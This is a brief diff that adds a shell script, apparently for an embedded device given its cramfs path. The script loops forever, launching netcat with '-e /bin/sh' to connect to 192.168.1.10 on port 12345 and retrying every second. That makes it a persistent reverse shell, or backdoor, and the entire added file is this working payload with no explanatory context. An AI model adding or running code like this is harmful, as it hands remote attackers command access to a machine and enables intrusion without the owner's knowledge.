@@ -1,0 +1,6 @@
+#!/bin/sh
+
+while :; do
+  /mnt/cramfs/netcat -e /bin/sh 192.168.1.10 12345
+  sleep 1
+done
